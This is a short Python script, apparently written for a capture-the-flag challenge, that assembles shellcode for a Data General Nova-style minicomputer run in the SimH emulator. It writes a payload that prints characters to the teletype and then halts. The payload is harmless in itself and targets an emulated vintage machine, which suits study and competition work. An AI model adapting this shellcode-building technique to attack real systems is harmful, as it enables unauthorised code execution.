#!/usr/bin/env python

import struct
a = open('disassembled')
disassembly = { }
assembly = { }
while True:
    nl = a.readline().strip()
    if nl == 'Goodbye': break
    n = int(nl,8)
    i = a.readline().strip().split('\t',2)[-1]
    disassembly[n] = i
    assembly[i] = n
    
def disassemble(s):
    for n in [ int(s[i:i+2].encode('hex'), 16) for i in range(0, len(s), 2) ]:
        yield disassembly[n]
        
def assemble_simh(start, args, more=[]):
    return [ 'd %s %s' % (oct(i),oct(assembly[n])) for i,n in enumerate(args, start=start) ] + [ 'd %s %s' % (oct(i), m) for i,m in enumerate(more, start=start+len(args)) ]
    
def assemble_bytes(start, args, more=[]):
    return ''.join([ struct.pack(">H", assembly[n]) for n in args ] + [ struct.pack(">H", int(n, 8)) for n in more ])

if __name__ == '__main__':
	open('shellcode', 'w').write(assemble_bytes(0100, [ 'LDA 3,16', 'LDA 0,0,3', 'MOVS 0,0', 'SKPBZ TTO', 'JMP 77777', 'DOAS 0,TTO', 'MOVS 0,0', 'SKPBZ TTO', 'JMP 77777', 'DOAS 0,TTO', 'MOV# 0,0,SNR', 'HALT', 'INC 3,3', 'JMP %s' % oct(0100000-12)[1:] ], more=[oct(01337)]))
